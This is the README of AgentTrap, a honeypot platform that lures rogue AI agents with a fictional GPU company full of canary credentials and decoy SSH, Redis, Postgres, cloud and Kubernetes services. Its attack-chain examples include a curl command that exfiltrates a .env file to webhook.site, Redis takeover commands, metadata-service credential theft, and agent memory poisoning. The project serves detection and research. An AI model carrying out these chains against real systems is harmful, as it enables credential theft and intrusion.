# AgentTrap

Deception platform for rogue AI agents. A public **spoke** serves a believable fictional company full of
planted credentials (canaries) and decoy services; a private **hub** collects what visitors do, follows each
canary from where it was shown to where it was used, and classifies the visitor (scanner, crawler, AI agent,
rogue agent). v1 runs one hub and one spoke on a single host.

The spoke serves the **DemoGPU** persona, a fictional GPU inference company. See `AgentTrap_Spec_v0.5.md` §29.14 and §30.

> **Security model.** Everything on the facade is a decoy: the keys, tokens, passwords and "exposed" files are
> fake on purpose. The hub, its dashboard, Postgres and Redis listen only on internal Docker networks and are
> never published; spokes dial out to the hub over mTLS. See `SECURITY.md` to report a real vulnerability.

## Layout

| Path | What |
|---|---|
| `cmd/agenttrap` | Single binary: `hub`, `spoke`, `pki init`, `admin` |
| `internal/hub` | Enrollment, cert renewal, event ingest, correlation, admin API, Postgres store |
| `internal/spoke` | mTLS hub client, disk queue, runner |
| `internal/pki` | Private CA for spoke↔hub mTLS |
| `internal/canary`, `internal/correlate` | Per-spoke canaries, chain → incident rules |
| `internal/ja4` | JA4 TLS fingerprinting and the packet sensor |
| `internal/fingerprint` | Probabilistic labels for the software driving a client (SDK, MCP/OAuth client, automation, LLM or script) |
| `internal/cluster`, `internal/campaign` | Behavioral clustering and campaign correlation |
| `internal/testsuite` | Facade test suite and consistency score |
| `internal/classify`, `internal/geo`, `internal/graph` | Behavior classes (scanner, crawler, AI agent, rogue agent), GeoIP, link graph |
| `internal/digest` | Daily email digest and ingestion alerts |
| `internal/dashboard`, `web/` | Admin dashboard (Vue, built with Bun into the Go binary) |
| `adapters/demogpu` | Facade: www, docs, OpenAI-compatible API, console with OAuth/OIDC, MCP, A2A, status, vLLM, SSH node, Redis cache, Postgres, AWS (`aws.`) + IMDS, Kubernetes (`k8s.`) |
| `modules/` | Honeypot modules: persona-independent traps for specific attacks (`traversal`, `webshell`, `aiplatforms`, `secretfiles`, `php2shell`); registry in `modules/builtin` |
| `internal/relay` | Publishes a TCP port and forwards it to a decoy on an internal network (PROXY protocol) |
| `personas/demogpu/pack.json` | Frozen world pack |
| `deploy/pingap`, `deploy/pingap-prod` | Edge proxy config (Pingap 0.16), local and production |
| `scripts/` | Provisioning, deploy checks, backups, logs, diagnostics, firewall |

## Server setup

On a fresh Ubuntu server, as root: `./scripts/provision.sh` (Docker, Compose, BuildKit via docker-buildx, swap),
then `./scripts/init-secrets.sh`, `docker compose up -d --build` (the hub creates its spoke CA; then move the root key offline, see [Spoke↔hub PKI](#spokehub-pki)), `./scripts/install-cron.sh` (nightly backup,
weekly cleanup) and `./scripts/verify-deploy.sh`. `./scripts/auto-updates.sh` installs security and regular Ubuntu
updates (Docker included) every night at 03:00 US Central and reboots when an update needs it.

Container logs go to journald (`docker-compose.yml`), so they survive restarts, `up --build` and reboots;
`./scripts/persistent-logs.sh` (run by provision) makes the journal persistent and caps it at 2G / 90 days.
Read them with `docker compose logs --since 1h hub` or `journalctl CONTAINER_NAME=agenttrap-hub-1 --since yesterday`
(`-b -1` for the previous boot, `journalctl -u docker` for the daemon). `./scripts/prod-diagnose.sh` prints a
read-only health and log-pattern summary of the last 24 hours.

## Spoke↔hub PKI

Spokes and the hub authenticate each other with mTLS certificates from a
private CA that belongs to each deployment. No CA material is in this
repository: every operator creates their own, and the root key never belongs
in git (`pki-offline/`, `*.key` and `*.pem` are ignored, and the pre-commit
hook refuses them).

| File | Purpose | Where it lives |
|---|---|---|
| `root.crt` | Trust anchor (10 years) | Hub and offline copy |
| `root.key` | Signs the intermediate; needed only to create a new one | **Offline only** |
| `intermediate.crt` / `.key` | Issues spoke and hub certificates (5 years) | Hub |
| `pack.key` | Signs the world pack spokes download | Hub |

**Create the CA.** With `AGENTTRAP_AUTO_PKI=true` (the compose default), the hub
creates all of these in its data volume (`/var/lib/agenttrap/pki`) on first
start and logs `created CA; move the root key offline`. To create them on a
trusted machine instead, run `agenttrap pki init --dir ./pki` and copy
everything except `root.key` into the hub's PKI directory before first start.

**Move the root key offline** once the hub is running. From your workstation
(the volume path is the Docker default):

```sh
P=/var/lib/docker/volumes/agenttrap_hubdata/_data/pki
mkdir -p pki-offline && chmod 700 pki-offline
ssh <server> "cat $P/root.key" > pki-offline/root.key && chmod 600 pki-offline/root.key
ssh <server> "cat $P/root.crt" > pki-offline/root.crt
# check the key pairs with the certificate, then remove it from the server
[ "$(openssl pkey -in pki-offline/root.key -pubout)" = "$(openssl x509 -in pki-offline/root.crt -pubkey -noout)" ] \
  && ssh <server> "shred -u $P/root.key"
```

The hub keeps working without it. Keep `pki-offline/` on one trusted machine
plus an encrypted backup (a password manager or encrypted volume). Never put
it in the repository, a Docker build context or a server backup. Server backups
(`scripts/backup.sh`) copy the hub volume, so move the key before the first
nightly backup runs, or delete the backups taken while it was there.

**Losing the root key** does not stop the deployment. It only means a new
intermediate cannot be signed under the same root when the current one nears
expiry, so the fix is a new CA: `pki init` again and re-enroll the spokes.

## Run locally

```sh
./scripts/init-secrets.sh
echo LOG_DRIVER=json-file >> .env   # Docker Desktop has no journald
HTTP_PORT=8088 HTTPS_PORT=8443 docker compose up -d --build
curl -H 'Host: docs.demogpu.example' http://127.0.0.1:8088/
curl -k --resolve docs.demogpu.example:8443:127.0.0.1 https://docs.demogpu.example:8443/   # self-signed dev cert
docker compose exec hub agenttrap admin --token-file /run/secrets/admin_token get /admin/incidents
```

## Dashboard

The hub serves the admin dashboard on its address on the internal `core` network (`10.90.0.5:9090`).
It is not reachable from the internet. Open it through an SSH tunnel:

```sh
ssh -p 2222 -L 9090:10.90.0.5:9090 root@<server>
# then browse to http://localhost:9090 and sign in with secrets/admin_token
```

The UI is built from `web/` (Vue 3, strict TypeScript, Bun, Vite, ECharts) into `internal/dashboard/dist`
and embedded in the Go binary. For UI work: `cd web && bun install && bun run dev` with the tunnel open.
Without a server, serve a realistic in-memory dataset (rogue and AI agents, scanners, crawlers from about
20 countries) on the same port and sign in with 32 `a` characters:

```sh
DEMO_ADMIN_LISTEN=127.0.0.1:9090 DEMO_GEO_DB=path/to/dbip-city-lite.mmdb \
DIGEST_PREVIEW=/tmp/digest.html go test ./internal -run TestDemoServer -timeout 0
```

`DIGEST_PREVIEW` also writes the email digest built from that data (`/tmp/digest.html` and `.txt`).

The web toolchain is Bun only, locally and in Docker: no Node.js is installed or run (`web/node_modules` is
simply where `bun install` puts packages).

TypeScript stays on 6.x. TypeScript 7 is a native compiler without the JavaScript API vue-tsc needs; it
moves when vue-tsc supports TypeScript 7.1 (tracked in vuejs/language-tools#5381); Dependabot skips
TypeScript majors.

Vite 8 depends on lightningcss (MPL-2.0, a file-level copyleft). It is
allowed as a build-only tool: it runs only in the build stage, is never modified and never ships (the image
holds the Go binary and the built assets). `scripts/check-licenses.ts` lists such tools by name; everything
that ships stays strictly permissive.

`bun run typecheck` uses `web/scripts/vue-tsc.ts`, a small wrapper that applies
vue-tsc's TypeScript patch in a way Bun's module loader supports.

Admin endpoints: `GET /admin/overview?hours=` (totals, classes, funnel, severity, `exploits` per module), `GET /admin/health` (per-spoke ingestion status), `GET /admin/research?hours=` (campaigns, clusters, deception metrics), `GET /admin/incidents`, `GET /admin/events?source=&kind=&surface=&hours=&limit=`, `GET /admin/spokes`,
`POST /admin/spokes {"id":"eu-1"}` (returns an enrollment bundle), `POST /admin/spokes/{id}/enrollment`,
`POST /admin/spokes/{id}/revoke`.

## Canary chain (DemoGPU)

1. A trial key is issued (`POST /v1/trial-keys`, documented in the docs)
2. Sandbox key used at `api.` (OpenAI-compatible)
3. Provider key revealed via console API or MCP `get_provider_key`
4. Provider key reused at `vllm.`, which makes the incident critical

A second path runs through the protocols agents use to talk to each other:

1. The A2A account assistant (`mcp./a2a`) hands service accounts off to an "internal" Ops agent (`mcp./a2a/ops`), a decoy
2. The Ops agent reveals the `ci-bot` service account's client secret (stage 3)
3. The secret is used at the OAuth token endpoint (stage 4, critical)

OAuth client secrets from dynamic registration and every issued access token are per-exposure canaries too.

A canary from one spoke used at another spoke marks the incident `cross_spoke`. A canary used by a source that never saw it marks it `out_of_band`.

## OAuth, OIDC and A2A

`console.` is the authorization server (issuer `https://console.<domain>`): discovery documents, JWKS, dynamic client
registration, authorization code with PKCE (S256 required), client credentials, the device flow, token exchange
(RFC 8693), introspection, revocation and userinfo. Sign-in never succeeds, so codes and device grants are never
issued. `mcp.` and `api.` publish protected-resource metadata (RFC 9728), and an MCP tool call without a credential
gets the 401 that starts an MCP client's OAuth flow. Recorded as signals: the client name each client registers,
requested honey scopes (`keys:admin`, `billing:breakglass`), scope escalation through token exchange, delegation
(actor tokens) and device-flow polling faster than the interval.

A2A 0.3 (JSON-RPC) runs at `mcp./a2a`, with the agent card at `/.well-known/agent-card.json` on `www.` and `mcp.`.
It answers from the world pack only: usage, models, provider keys (masked, or revealed on request). Push
notification webhooks that agents ask for are recorded and refused.

## SSH node decoy

Port 22 is the persona's GPU node `eu1-vllm-03` (`adapters/demogpu/sshd.go`), not the host. The `ssh-relay`
service publishes 22 and forwards to the spoke on the internal network, prefixing each connection with a PROXY
header so the decoy sees the real client address; the host's own sshd is on 2222.

Every connection, login attempt (password hash, key fingerprint, client version) and command is recorded. Only a
planted credential opens a session: the `deploy` password the ops agent hands out, or another DemoGPU canary
reused as a password. The session is a simulated shell answering from the world pack — nothing is executed.
Reading `~/vllm/.env` mints a per-exposure provider key (stage 3), and using it at `vllm.` is stage 4. Port
forwarding, SFTP and outbound fetches fail the way a node with no egress does, and the target address is recorded.

v1 chain through the node:

```
ops agent asked for node access -> deploy password revealed -> SSH login -> .env read -> provider key reused
```

### Brute-force protection

Three layers keep commodity scanning from overwhelming a decoy or filling the event store, without losing the
intelligence in an agent's first probes. All three are portable — in the binary or in host nftables — and depend on
no cloud-provider firewall:

- **Relay rate limit** (`internal/relay`): on the raw-TCP decoy ports, a source may open a burst of connections (15
  by default), then one more per minute; the excess is dropped before it reaches the decoy or records an event. The
  first burst still gets through, so the client version, tried usernames and passwords, and key fingerprints are
  captured. Operators are exempt (`AGENTTRAP_RELAY_EXEMPT`).
- **Per-source event limit** (`internal/throttle`, applied in the spoke): caps how many events any one source can
  record — across every surface, including HTTP, where a single keep-alive connection can fire thousands of scan
  requests that connection limits never see. Beyond a per-source budget (100 events, then one per 2s by default) bulk
  traffic is dropped and rolled up into one `throttled` event, so a flood becomes a single row. High-signal events (a
  canary shown or used, a credential, a login, a form) are **never** dropped. Tune with `AGENTTRAP_EVENT_BURST` /
  `AGENTTRAP_EVENT_REFILL`.
- **Host firewall** (`scripts/decoy-firewall.sh`, nftables): a source that *sustains* a flood is dropped in the
  kernel for an auto-expiring window (1h) so its packets are blackholed and it backs off. Two tiers: the decoy ports
  (22, 6379) ban at a low rate since nothing legitimate connects to them; the web ports (80, 443) ban only on a
  genuine connection flood, so normal browsers, agents and crawlers are never touched. It never matches the real
  sshd on 2222. Install with `sudo EXEMPT=<your IPv4> ./scripts/decoy-firewall.sh` (`EXEMPT` takes a
  comma-separated list of operator addresses that are never banned); inspect with `--status`; remove with `--remove`.

## Redis cache decoy

Port 6379 is the persona's exposed, unauthenticated Redis (`adapters/demogpu/redis.go`), the misconfiguration
attackers scan for. The `redis-relay` service publishes it and forwards to the spoke with a PROXY header; the real
cache does not exist and nothing is ever stored. It speaks enough of RESP to look real (`PING`, `INFO`, `HELLO`,
`CONFIG`, `CLIENT`, `KEYS`/`SCAN`, `GET`/`MGET`, RESP2 and RESP3), and every command is recorded.

The classic exposed-Redis takeover moves are answered with the success reply an attacker expects, but only the
attempt is recorded — nothing happens:

- `CONFIG SET dir` / `dbfilename` then `SAVE` (writing `authorized_keys` or a cron job): the path and filename are
  captured; no file is written.
- `SLAVEOF` / `REPLICAOF`: the attacker's own master address is recorded; no replication starts.
- `MODULE LOAD`: recorded and refused.

Reading a planted key mints a per-exposure canary: `demogpu:session:console:svc-ci` yields a session token, and
`demogpu:cache:provider_key:vllm` yields a vLLM provider key — the same stage-4 reuse detection as the SSH `.env`.

## Postgres database decoy

Port 5432 is the persona's exposed database (`adapters/demogpu/postgres.go`), published by `pg-relay`. It is
completely separate from the real events database: the spoke has no route to the internal `core` network where the
real Postgres lives, so the decoy can never reach it, and it runs no SQL.

It speaks the v3 wire protocol: it declines SSL/GSSAPI like a plaintext instance, records the `user`, `database` and
`application_name` a client declares, and asks for a **cleartext password** so every attempt is captured verbatim —
useful against credential spraying. A wrong password gets the real `28P01` error. A planted role and password
(`demogpu_app`) open a read-only session that answers canned recon queries (`version()`, `current_user`,
`information_schema.tables`, `SELECT * FROM api_keys`); reading the keys table mints a per-exposure vLLM provider key.

The database password is planted in the SSH node's `~/vllm/.env` as `DATABASE_URL`, so the surfaces chain:

```
read .env over SSH -> DATABASE_URL password -> log into Postgres -> dump api_keys -> provider key reused
```

## Cloud (AWS) decoy

`aws.demogpu.example` is the persona's synthetic AWS account (`adapters/demogpu/aws.go`, `awss3.go`,
`awsjson.go`). A planted `~/.aws/config` on the SSH node points an SDK at it (`endpoint_url`,
path-style S3), so an agent that finds the credentials there discovers a believable estate: STS, IAM,
S3, Secrets Manager, SSM, EC2, EKS/ECS discovery, CloudTrail and CloudWatch Logs, each answered in its
own wire protocol (Query/XML, REST-XML, JSON 1.1) with the right `Server`/`x-amzn-RequestId` headers —
never as nginx. Requests are dispatched by the signing service in the SigV4 `Authorization` header,
which carries the access key id in clear; a use of the planted key names the read it came from. Every
bucket and service is private, so an unsigned request is refused (`AccessDenied` /
`MissingAuthenticationToken`), not served.

The **instance metadata service** (`169.254.169.254`) is answered from the SSH node's `curl`/`wget`
(`adapters/demogpu/imds.go`): a tokenless IMDSv1 GET of `iam/security-credentials/<role>` hands out
temporary `ASIA` credentials (the IMDSv2 `PUT /latest/api/token` handshake is also honoured). The
access key ids are fixed-shape 20-character canaries recognised by equality (too short to carry a
minted payload); their reuse in a signed call is the signal.

The values are the traps, and they tie the cloud surface to the others: Secrets Manager
(`prod/db/app-credentials`, `prod/vllm/api-key`), SSM SecureStrings and the S3 `terraform.tfstate`
object all embed the same `pg_app_password` and `provider_key_vllm` canaries the SSH, Postgres and vLLM
decoys use, so a credential lifted from the cloud and reused elsewhere correlates across protocols:

```
read ~/.aws/config over SSH -> SDK to aws.demogpu.example -> GetSecretValue prod/db/app -> DB password reused
curl 169.254.169.254 -> instance-role creds -> signed AWS call (ASIA key used)
```

## Kubernetes decoy

`k8s.demogpu.example` is the persona's synthetic Kubernetes API server (`adapters/demogpu/kube.go`). A planted
`~/.kube/config` points a client there with a service-account bearer token (a JWT-shaped canary), and the
EKS `DescribeCluster` response advertises the same endpoint. It answers a read-only subset of the API —
`/version` and discovery, namespaces, pods, deployments, secrets, configmaps, service accounts, GPU nodes
and `SelfSubjectAccessReview` ("kubectl auth can-i") — from the world pack. Discovery is open (as on a real
cluster); resource access needs the token, and an anonymous or wrong-token request gets a proper `401`
`Status` object, never nginx. The API server sets no nginx `Server` header, only an `Audit-Id`.

Secret objects are the trap: their `data` values embed the same `pg_app_password`, `provider_key_vllm`,
`hf_token` and `aws_access_key_id` canaries the SSH, Postgres, vLLM and AWS surfaces use (base64-encoded as
real Secret data), so pulling a secret from the cluster and reusing it correlates across protocols. The GPU
nodes carry the same `i-…` instance ids and `providerID`s as the EC2/IMDS surface.

```
read ~/.kube/config over SSH -> kubectl to k8s.demogpu.example -> get secret db-credentials -> DB password reused
```

## Honeypot modules

Modules (`modules/`) are self-contained traps, each for one kind of attack and
independent of the persona. The facade offers every HTTP request to the enabled
modules before persona routing; the module with the strongest claim answers it
(`Attack` beats `Vhost`: a recognized exploit on any host, versus the default
virtual host for bare-IP or unknown hostnames). The facade records a `request`
event tagged with `module`, plus an `exploit` event (`stage` probe/exploit,
`cve`, `signals`, captured field values and filenames) when the module saw an
attack. Exploit counts appear in the dashboard overview and the daily digest.

Keys a module hands out are real persona canaries tagged with the module:
using one is recorded, but it is classified as scanner credential harvesting
(not a rogue agent) and kept out of the incident chain and funnel, since
scanners harvest planted files in bulk.

Enable with `AGENTTRAP_MODULES` on the spoke: `all` (default), `none`, or a
comma-separated list. To add one: create `modules/<name>` implementing
`modules.Module`, register it in `modules/builtin`, and test it alongside.

| Module | Attack | Behaviour |
|---|---|---|
| `traversal` | Apache cgi-bin traversal/RCE (CVE-2021-41773/42013), Vite `/@fs/` bypass (CVE-2025-30208/31125/31486), Tomcat `..;/`, generic `../` | Decoy `/etc/passwd`, `/proc/self/environ` (planted AWS key), `win.ini`; cgi `bin/sh` POSTs get canned `id`/`uname` output and their commands and download URLs are recorded. Nothing is read or executed. |
| `webshell` | Bots looking for webshells others planted (`alfa.php`, `chosen.php`, random-name drops, `?cmd=`) | Shell login page; records passwords, commands (with canned output), uploads (filename + sha256). |
| `aiplatforms` | Langflow (CVE-2025-3248, CVE-2026-33017), Flowise (CVE-2025-59528, CVE-2026-46442), Feast (CVE-2026-23536), exposed Ollama, LiteLLM config leaks | Platform-shaped answers; records submitted code, prompts and model pulls; LiteLLM config carries planted provider keys. |
| `secretfiles` | Leaked config hunting: `.env` variants, `.git/config`, `.aws/credentials`, compose/CI files, `wp-config.php` backups | Believable files carrying per-exposure planted keys. |
| `php2shell` | PHP2Shell, CVE-2026-109618 / CVE-2026-109619 | Default vhost is a legacy nginx + PHP-FPM 8.4.26 portal (phpinfo at `/phpinfo.php`, `/info.php`, ...). Form POSTs with upload-progress fields, PHPSESSID fields, nested names, hundreds of parts, PHP in filenames, a huge urlencoded name or an oversized body are answered with the pre-script memory-exhaustion fatal error a vulnerable worker shows. Bodies are parsed up to 4 MiB and drained up to 64 MiB. |

## Agent memory

The MCP server exposes the customer team's shared **agent memory**
(`adapters/demogpu/memory.go`): `memory_search`, `memory_list`, `memory_read`,
`memory_write`, `memory_share`, `memory_delete`. The store holds notes owned by
different principals (the team's people and its `ci-bot`), and a leaked team key
reads all of them — so discovering another principal's notes is the first
signal. Some are **canary memories**: a runbook or credential note whose content
carries a `{{canary:<slot>}}` (a secret planted where an agent stores context),
minted on read and reusing the same `provider_key_vllm`, `pg_app_password` and
`aws_access_key_id` canaries as the other surfaces, so a credential lifted from
memory and reused elsewhere correlates. Not every note is a trap — model
preferences and standup notes sit alongside them.

Search snippets mask the secret (only a full `memory_read` reveals it). Writes
and shares are recorded as intent — a credential-hunting search, a write that
replants one of our canaries (memory poisoning), or sharing a secret note
outward (propagation) — though nothing is persisted; the classifier scores and
names each in incidents and the digest.

```
leaked team key -> memory_search "password" -> memory_read the DB runbook -> planted password reused
```

## Retrieval knowledge base

The MCP server also exposes the team's **retrieval knowledge base and vector
store** (`adapters/demogpu/rag.go`): `kb_collections`, `kb_search`, `kb_get`,
`kb_similar`. Documents sit in collections (an engineering wiki, runbooks, a
Slack export, support tickets); `kb_similar` is a stand-in for vector
similarity. Some are **canary documents** — a wiki page with prod DB and AWS
credentials, an incident thread where a key was pasted, a support ticket holding
a customer's token — reusing the shared canary slots, minted on retrieval. Each
document carries a **taint id** recorded on the `kb_get` event, so a later use of
its content correlates the retrieval with the movement (information lineage);
the canary in it gives exact-value tracking through the canary chain and egress
broker. Search snippets mask secrets; only `kb_get` reveals them. The classifier
scores and names credential-hunting searches and retrievals of secret-bearing
documents, in incidents and the digest.

```
kb_search "aws secret key" -> kb_get the prod-access wiki page -> AWS key + DB password reused (lineage tnt-3a91)
```

## Controlled egress

Every outbound request an occupant of the node makes to the outside world passes through one broker
(`adapters/demogpu/egress.go`); nothing is ever forwarded. The broker records the destination and payload,
scans it for canaries (`canary.Set.Scan` matches fixed values by substring and minted ones by shape and
MAC), and flags any it finds as **exfiltration** — a canary use tagged `direction: outbound` with the
destination, distinct from a canary presented back to us. It then returns a contained decision: a **recognised
collector** (webhook.site, requestbin, pastebin, Discord/Slack webhooks, Telegram, interactsh and the like)
gets a plausible success so the actor believes the exfil worked and reveals its full chain, while everything
else **defaults to deny** — the connection refused the way an egress-firewalled host drops it.

The SSH node's `curl`/`wget` route through it: `curl -d @file` / `-T` uploads are read (which mints the
file's canaries), so the exfiltrated bytes are captured and matched. Internal and persona-owned destinations
are lateral movement, not egress, and fail closed without reaching the broker; the metadata service and the
node's own vLLM are answered as before.

```
read ~/vllm/.env over SSH -> curl -d @.env https://webhook.site/… -> provider key + DB password flagged outbound
```

## Adaptive deception

The facade changes what it offers in ways a real service plausibly would (`adapters/demogpu/adaptive.go`):

- Authenticated MCP and A2A clients see admin tools and skills (`list_service_accounts`, `rotate_provider_key`)
  that anonymous clients do not.
- Once an address has had a provider key revealed, answers about keys and usage mention the scheduled rotation and
  the Ops agent. Scanners and shallow visitors never see it.
- Each address sees one stable wording of each honey tool description (`lures` in the world pack). The Campaigns
  page reports, per wording, how many addresses saw it and then called the tool.

## Research

- **Framework fingerprinting**: labels such as `openai-python`, an MCP client's declared name, `webdriver`, or
  `llm`/`script` for what chooses the requests. Evidence comes in independent families (user agent, SDK headers,
  protocol self-description, TLS, browser behavior, timing, content). One family alone is never more than "possible".
- **Behavioral clustering**: clients become sets of behavior tokens (step sequences, tools, canary stages, software,
  TLS stack, pacing), weighted by rarity, and join at a weighted Jaccard similarity of 0.55. A cluster is a family of
  look-alike clients, not proof of one operator.
- **Campaign correlation**: agents join through sessions, link-graph paths, a shared declared identity, or the same
  cluster together with the same client software. Exported daily as `campaigns.jsonl`.

## Facade test suite

`agenttrap testsuite` tests a persona the way a careful agent checking for a honeypot would, using only public
behavior. It scores the persona on the facade consistency dimensions of spec §29.10: naming, identity, status history,
API and docs agreement, dates, error realism and latency, canary placement, DNS and TLS. It exits non-zero below
85/100. `go test ./internal/testsuite` runs it against the built-in persona on every test run.

```sh
agenttrap testsuite                                 # live persona over DNS and HTTPS
agenttrap testsuite -addr 127.0.0.1:8443 -insecure    # local deployment
```

It requests a trial key and calls the API, so run it from an operator address.

## Attack map

The admin dashboard has an **Attack map** (`web/src/views/AttackMapView.vue`): a
world map of where attacker traffic comes from, by city, over the selected
window. The hub geolocates each non-operator actor's address locally with
**DB-IP Lite City** (`internal/geo`), and `GET /admin/attack-map` aggregates them
into city points sized by how many actors share a location and coloured by the
class of the worst actor there. The map renders with the ECharts already in the
dashboard (an animated `effectScatter` over a bundled public-domain Natural
Earth outline) — no map tiles, keys or external calls.

The geolocation database is a host-mounted file, not committed or baked into the
image (see `deploy/geo/README.md`); without it the map is disabled and nothing
else changes. DB-IP Lite is CC-BY-4.0, so the map carries an "IP geolocation by
DB-IP" attribution.

## TLS fingerprinting

The `ja4-sensor` container shares Pingap's network namespace, captures ClientHellos with `CAP_NET_RAW` only,
and reports JA4 fingerprints to the spoke. Requests are joined to their connection's fingerprint by client
`ip:port` (Pingap sends `X-Real-Port`). Packet capture works on Linux hosts only. Docker Desktop on macOS
runs it inside its VM, which is enough for local testing.

The JA4 implementation is our own, written from the JA4 specification (JA4 is BSD-3-Clause and FoxIO disclaims
patents on it). JA4+ methods and FoxIO-licensed data (ja4db, sample captures, mapping files) are not used.
The sensor also records handshake tells (GREASE, ECH, post-quantum key share, ALPS), JA4_o, JA3 (BSD-3-Clause)
and the SYN's TTL and option layout; the classifier checks each user agent against them.

## Link graph

Postgres runs with the Apache AGE extension (Apache-2.0), built into `deploy/postgres` on top of
`postgres:18-alpine`: same service, same data volume. The hub folds events into the `links` graph every two
minutes (sources linked through planted keys, credentials, agent IDs, prompts, registered names and client
stacks) and shows each source's paths to known agents with the reasons. Queries use fixed-length patterns
only (AGE's variable-length paths load the whole graph into memory), skip entities shared by more than 25
sources, and never change a class. Without AGE the hub logs "link graph disabled" and runs as before.
Backups leave the graph out (AGE graphs do not survive `pg_restore`); after a restore the hub finds the graph
empty and rebuilds it from the stored events.

## Backup and restore

`scripts/backup.sh` runs nightly (03:17 UTC) and writes a pair to `/opt/agenttrap/backups`, kept 7 days:

- `agenttrap-<stamp>.dump`: the database, checked readable by `pg_restore --list` before it is kept.
- `agenttrap-<stamp>.state.tar.gz`: everything the database does not hold: hub PKI and pack signing key,
  spoke identity and queue, `secrets/`, `.env`, the Pingap config with its Let's Encrypt certificate and the
  contact notifier's state.

Both hold secrets (mode 0600). Copy them off the server too: a lost droplet takes them with it.
`scripts/restore.sh check` restores the newest dump into a scratch database and reports row counts; cron runs
it every Sunday and `verify-deploy.sh` reports the result.

Replace the live database: `scripts/restore.sh db <stamp>.dump --yes` (backs up the current state first).

Rebuild on a new server from a pair:

```sh
scripts/provision.sh                        # Docker and base packages
# copy the app to /opt/agenttrap/app and the pair to /opt/agenttrap/backups
scripts/restore.sh state <stamp>.state.tar.gz --yes
docker compose up -d --build postgres
scripts/restore.sh db <stamp>.dump --yes
scripts/install-cron.sh && scripts/verify-deploy.sh
```

Then point DNS at the new address. The spoke keeps its identity (no re-enrolment) and the hub rebuilds the
link graph from the restored events.

## Network rules

The host's own sshd listens on 2222 (`scripts/ssh-port.sh`), leaving port 22 free for the SSH decoy. The droplet
has no DigitalOcean cloud firewall: the Droplet Console connects from unpublished DigitalOcean addresses, so an
allowlist on 2222 would lock it out. sshd accepts keys only.

Only Pingap publishes ports. Hub, spoke and PostgreSQL sit on internal Docker networks with no internet egress.
The admin API listens on loopback inside the hub container. Pingap's admin UI is disabled.

## Daily digest

`scripts/digest.sh` emails the last 24 hours of findings (rogue and AI agents with reasons and prompts,
agent sessions, registrations, incidents, exploit attempts on the honeypot modules, crawler impersonation,
browser automation, new fingerprints). The subject and opening line give the verdict.

Every incident is listed with its address, country, the stages it reached, its score and first/last seen,
next to a plain-English meaning of its severity. Severity measures how deep an address got into the decoy,
never real damage: every key involved is planted, so there is nothing to rotate or patch. Severity follows
the incident score: critical 50+ (used a deep secret, collected several, or carried a key elsewhere), high
25–49 (got a deep secret), medium 15–24 (used a planted credential it was shown), low below 15. For critical
and high, the email suggests looking the address up in the dashboard and reporting it to the network owner.

`scripts/digest.sh --dry-run` prints it. It sends through the Mailjet Send API (HTTPS; DigitalOcean blocks
outbound SMTP ports). Set `DIGEST_TO`, `DIGEST_FROM`, `DIGEST_MAILJET_API_KEY` and `DIGEST_MAILJET_SECRET_FILE`
in `.env`; the sender domain must be validated in Mailjet (ownership TXT, SPF include, DKIM).

## Exports

Every actor record carries the identity it declared in its user agent (name, version, operator URL or email),
alongside how it described itself when registering an integration. Daily snapshots go to
`/opt/agenttrap/exports/YYYY-MM-DD/` (`scripts/export.sh`), and the same data is available from
`GET /admin/export/{name}?hours=N`:

| File | Format | Use |
|---|---|---|
| `iocs.stix.json` | STIX 2.1 bundle | MISP, OpenCTI, SIEMs |
| `dnsbl.zone` | rbldnsd ip4set (127.0.0.2 scanner, .3 rogue agent, .4 crawler impersonation) | DNS blocklist |
| `blocklist.csv` | CSV | Firewalls, quick lookups |
| `actors.jsonl`, `sessions.jsonl`, `campaigns.jsonl` | JSON Lines | Analytics |
| `events.jsonl.gz` | JSON Lines, gzip | Raw events for re-analysis |

Only rogue agents, crawler impersonators and medium/high-confidence scanners are listed as indicators.
Operator traffic is excluded everywhere.

## Test

```sh
go test ./...
bun scripts/check-licenses.ts   # run from the repo root: every npm and Go dependency must be permissive
```

The pre-commit hook (`.githooks`) runs the license check whenever `go.mod`, `go.sum`, `package.json` or
`bun.lock` change.

On a deployed server (Linux), check containers, sensor privileges, exposed ports, network isolation and
recorded client IPs:

```sh
sudo ./scripts/verify-deploy.sh
```

Run it once after `docker compose up`, then send a request from another machine and run it again.
The recent sources it prints should be real client IPs with JA4 values, not Docker bridge addresses.

## Repository hygiene

Secrets, key material, backups, GeoIP data and captures are git- and
docker-ignored (`.gitignore`, `.dockerignore`). Enable the pre-commit check
once per clone; it refuses staged secret files, runs `gitleaks` when
installed (`brew install gitleaks`) and runs the license check when dependencies
change:

```sh
git config core.hooksPath .githooks
```

The decoy values planted in the persona and modules look like real keys on
purpose; `.gitleaks.toml` allowlists each one by its exact value (never by
file or rule), so a real secret next to them is still caught. Run a full scan
with `gitleaks git .`.

Before you expose your own deployment, change the persona, its domains and
the static decoy values. A facade that matches this public source is easy to
recognize as a trap. Canary values are derived per deployment from the hub's
secret seed, so they never match this repository.

## Contributing and security

Source only: pull requests are not accepted (see `CONTRIBUTING.md`). Issues are
welcome. Report security problems privately as described in `SECURITY.md`.

## License

MIT. See `LICENSE`.
